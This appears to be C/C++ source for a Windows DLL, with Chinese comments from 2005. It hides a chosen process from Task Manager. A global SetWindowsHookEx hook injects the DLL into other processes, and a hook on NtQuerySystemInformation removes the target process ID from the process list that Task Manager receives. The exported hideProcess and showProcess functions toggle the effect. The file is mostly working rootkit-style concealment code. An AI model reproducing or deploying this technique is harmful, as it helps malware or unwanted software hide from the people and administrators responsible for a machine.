
#include <windows.h>
#pragma hdrstop

#include <Winnt.h>
#include <winbase.h>
#include <stdio.h>
#include <Tlhelp32.h>
#include	<tchar.h>

#define _DLL_
#include "HookApi.h"

#include "HookClass.h"

#include	"qwmHideProcessCommProc.h"


 /*
 //  2005/05/01, 解除某些特殊的应用的冲突
 QY_DMITEM  CONST_notHookedTable[]  =
{
	{	0,		"sthsdvd.exe",		},		//  豪杰解霸8。0										//  0104
	{	0,		"sysExplr.exe",		},		//  豪杰解霸8.0(sp1 + sp2)										//  0104
	{	0,		"Mmxado.exe",		},		//														//  0108
	{	0,		"Mplayer.exe",		},		//	hsp3000_cn_050812(豪杰3000 0812)					//  0108
	{	0,		"Adconvert.exe",	},		//  hac2.7_cn_050812（豪杰音频通v2.7 build 0812）		//  0108
	{	0,		"Mmxado.exe",		},		//														//  0108
	{	0,		"Dvd2mpg.exe",		},		//  (视频工具>dvd转mpg)									//  0108
	{	0,		"DVDcopy.exe"		},		//  (视频工具>dvd复制分离)								//  0108
	{	0,		"GIFMAKE.exe"		},		//  (视频工具>转成gif)									//  0108
	{	0,		"uniteMPEG.exe"		},		//  (视频工具>mpg合并)									//  0108
	{	0,		"mpg4make.exe"		},		//  (视频工具>dvd转mpg4)								//  0108
	{	0,		"MP3REC.exe"		},		//  (音频工具>mp3录音机) hsp9_cn_050812(豪杰v9 0812)	//  0108,  2005/08/24
	{	0,		"cStar.exe",		},		//  中文之星XP											//  0104	
	{	0,		"xdict.exe",		},		//  金山词霸2005										//  0104
	{	0,		"erwerx32.exe",		},		//  ERwin ERX for ModelMart (日语)						//  0105
	//  {	0,		"winlogon.exe",		},	//  因为需要用loadlibrary在winlogon里装载远程线程，所以不hook, //  2005/07/28
	{	-1,		NULL,				},
};
*/


 //  2005/09/09
 QY_DMITEM  CONST_hookedTable[]  =
{
	{	0,		_T(  "taskMgr.exe"  ),		},
	{	-1,		NULL,				},
};


 BOOL  bNotHookedProcess(  )
{
	BOOL			bRet				=	FALSE;
	QY_DMITEM  *	pItem				=	NULL;
	TCHAR			dirName[512]		=	_T(  ""  );
	TCHAR			finalName[512]		=	_T(  ""  );

	if  (  getModuleDirAndFinalName(  dirName,  sizeof(  dirName  )  /  sizeof(  dirName[0]  ),  finalName,  sizeof(  finalName  )  /  sizeof(  finalName[0]  )  )  )  goto  errLabel;

	/*
	for  (  pItem  =  CONST_notHookedTable;  pItem->type  !=  -1;  pItem  ++  )  {
		 if  (  !strcmpi(  pItem->des,  finalName  )  )  break;
	}
	if  (  pItem->type  ==  -1  )  goto  errLabel;
	*/
	for  (  pItem  =  CONST_hookedTable;  pItem->type  !=  -1;  pItem  ++  )  {
		 if  (  !lstrcmpi(  pItem->des,  finalName  )  )  break;
	}
	if  (  pItem->type  !=  -1  )  goto  errLabel;


	bRet  =  TRUE;
errLabel:
	return  bRet;
}


//---------------------------------------------------------------------------

//NtQuerySystemInformation

typedef struct _THREAD_INFO
{
  LARGE_INTEGER KernelTime;
  LARGE_INTEGER UserTime;
  LARGE_INTEGER CreateTime;
  ULONG WaitTime;
  DWORD dwStartAddress;
  DWORD dwOwnerPID;
  DWORD dwThreadId;
  DWORD dwCurrentPriority;
  DWORD dwBasePriority;
  DWORD dwContextSwitches;
  DWORD dwThreadState;
  DWORD dwWaitReason;
  DWORD dwReserved;

}THREADINFO, *PTHREADINFO;

typedef struct _UNICODE_STRING
{
  USHORT Length;
  USHORT MaxLength;
  PWSTR  Buffer;

} UNICODE_STRING;

typedef struct _PROCESS_INFO
{
  DWORD dwOffset;
  DWORD dwThreadsCount;
  DWORD dwUnused1[6];
  LARGE_INTEGER CreateTime;
  LARGE_INTEGER UserTime;
  LARGE_INTEGER KernelTime;
  UNICODE_STRING ProcessName;

  DWORD dwBasePriority;
  DWORD dwProcessID;
  DWORD dwParentProcessId;
  DWORD dwHandleCount;
  DWORD dwUnused3[2];

  DWORD dwVirtualBytesPeak;
  DWORD dwVirtualBytes;
  ULONG  dwPageFaults;
  DWORD dwWorkingSetPeak;
  DWORD dwWorkingSet;
  DWORD dwQuotaPeakPagedPoolUsage;
  DWORD dwQuotaPagedPoolUsage;
  DWORD dwQuotaPeakNonPagedPoolUsage;
  DWORD dwQuotaNonPagedPoolUsage;
  DWORD dwPageFileUsage;
  DWORD dwPageFileUsagePeak;

  DWORD      dCommitCharge;
  THREADINFO ThreadSysInfo[1];

} PROCESSINFO, *PPROCESSINFO;

typedef long (__stdcall *PNTQUERYSYSTEMINFORMATION)(DWORD,PVOID,ULONG,PULONG);

long __stdcall MyNtQuerySystemInformation(
  DWORD SysInformatoinClass,
  PVOID SystemInformation,          
  ULONG SystemInformationLength,
  PULONG ReturnLength OPTIONAL);

TAPIHook *NtQuerySystemInformationHook = NULL;

//---------------------------------------------------------------------------

//HHOOK hCallWndHook = NULL;

LRESULT CALLBACK CallWndHook(int nCode,WPARAM wParam,LPARAM lParam);

//---------------------------------------------------------------------------
//这个值只用来调用SetWindowsHookEx
HINSTANCE hInst;

#pragma data_seg("SHAREDATA")

HHOOK hCallWndHook = NULL;
DWORD dwSelfProcessID = -1;

#pragma data_seg()

#pragma comment(linker,"/section:SHAREDATA,RWS")


//为了需要，DLL一启动就自动Hook了GetProcAddress、LoadLibraryA、LoadLibraryW、
//LoadLibraryExA、LoadLibraryExW这5个函数（见HookClass.Cpp）。当调用Unhook之后，
//这个DLL将在别的进程中卸载，但是对于本进程来说。DLL并没有马上卸载，所以那几个
//Hook仍然起作用，为了实现真正意义上的Unohok，设置了这个标志，在那几个Hook里边
//将检查这个标志，以表明是否进行Hook。
bool IsHook = false;

//进行实际的Hook调用
int __fastcall HookFunc();
int __fastcall UnhookFunc();

//---------------------------------------------------------------------------
//#pragma argsused

BOOL APIENTRY DllMain( HANDLE hModule, DWORD  reason, LPVOID lpReserved)
{
  hInst = (HINSTANCE)hModule;	 

  if  (  bNotHookedProcess(  )  )  return  TRUE;	//  2005/05/01

  if(reason == DLL_PROCESS_ATTACH)
  {
    DisableThreadLibraryCalls(hInst);

    __try
    {
      if(dwSelfProcessID != -1)
        HookFunc();
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {/* Do nothing */}
  }
  else if(reason == DLL_PROCESS_DETACH)
  {
    __try
    {
      UnhookFunc();             
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {/* Do nothing */}
  }

  return TRUE;
}
//---------------------------------------------------------------------------
 DLL_EXP_IMP int _cdecl getVer(  char  *  ver,  unsigned  long  size  )
{	 
	 strncpy(  ver,  CONST_qwmHelpDllVer,  size  );
	 return  0;
}

//Hook
//  DLL_EXP_IMP int _cdecl Hook(DWORD dwSelfProcessID_P)
 DLL_EXP_IMP int _cdecl hideProcess(DWORD dwSelfProcessID_P)
{                          
  dwSelfProcessID = dwSelfProcessID_P;

  if  (  !bMyPermittedProcess(  )  )  return  0;		//  加入了校验

  if(hCallWndHook == NULL)
    hCallWndHook = SetWindowsHookEx(WH_CALLWNDPROC,(HOOKPROC)CallWndHook,hInst,0);

  // Hook指定的函数
  HookFunc();

  return 1;
}
//---------------------------------------------------------------------------
//Unhook
//  DLL_EXP_IMP int _cdecl Unhook()
 DLL_EXP_IMP int _cdecl showProcess()
{
	 if  (  !bMyPermittedProcess(  )  )  return  0;  

  if(hCallWndHook != NULL)
  {
    UnhookWindowsHookEx(hCallWndHook);
    hCallWndHook = NULL;
  }

  // Unhook指定的函数
  UnhookFunc();
  
  return 1;
}           
//---------------------------------------------------------------------------
int __fastcall HookFunc()
{
  IsHook = true;

  SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_TIME_CRITICAL);
  
  NtQuerySystemInformationHook = new TAPIHook("NTDLL.DLL","NtQuerySystemInformation",
    					      (PROC)MyNtQuerySystemInformation,true);

  SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_NORMAL);
  return 1;
}
//---------------------------------------------------------------------------
int __fastcall UnhookFunc()
{
  //对于主程序本身，通过这个标志可以保证在没有退出主程序的时候也能Unhook。
  IsHook = false;

  if(NtQuerySystemInformationHook != NULL)
  {
    delete NtQuerySystemInformationHook;
    NtQuerySystemInformationHook = NULL;
  }
  return 1;
}
//---------------------------------------------------------------------------
//消息Hook，不做任何事，只是为了加载DLL到别的进程
LRESULT CALLBACK CallWndHook(int nCode,WPARAM wParam,LPARAM lParam)
{
  if(nCode < 0)
    return CallNextHookEx(hCallWndHook,nCode,wParam,lParam);

  // Do nothing
  return 0;               
}
//---------------------------------------------------------------------------
/*---------------------------------------------------------------------------

                         自定义的函数代码

//-------------------------------------------------------------------------*/
//---------------------------------------------------------------------------

long __stdcall MyNtQuerySystemInformation(
  DWORD SysInformatoinClass,
  PVOID SystemInformation,          
  ULONG SystemInformationLength,
  PULONG ReturnLength OPTIONAL)
{
  long Result;

  Result = ((PNTQUERYSYSTEMINFORMATION)(PROC)(*NtQuerySystemInformationHook))
  	       (SysInformatoinClass,SystemInformation,SystemInformationLength,ReturnLength);

  //一定要使用结构化异常处理，否则就有可能出现异常对话框。
  __try
  {
    if(SysInformatoinClass == 5 && Result == 0 /* STATUS_SUCCESS */)
    {
      PPROCESSINFO pProcessInfo;
      PPROCESSINFO pPrevProcessInfo;

      pProcessInfo = (PPROCESSINFO)SystemInformation;
      pPrevProcessInfo = pProcessInfo;

      while(true)
      {
        if(pProcessInfo != NULL && pProcessInfo->dwProcessID == dwSelfProcessID)
        {
          if(pProcessInfo->dwOffset == 0)
            pPrevProcessInfo->dwOffset = 0;
          else
            pPrevProcessInfo->dwOffset = pPrevProcessInfo->dwOffset + pProcessInfo->dwOffset;

          break;
        }

        if(pProcessInfo->dwOffset == 0)
          break;

        pPrevProcessInfo = pProcessInfo;
        pProcessInfo = (PPROCESSINFO)((byte*)pProcessInfo + pProcessInfo->dwOffset);
      }
    }
  }
  __except(EXCEPTION_EXECUTE_HANDLER)
  {
    /*/ 发生异常，但是不必做任何事
    ::MessageBox(NULL,"Exception Occured at self-defined function :(",NULL,MB_OK | MB_ICONWARNING);
    //*/
  }

  return Result;
}
//---------------------------------------------------------------------------
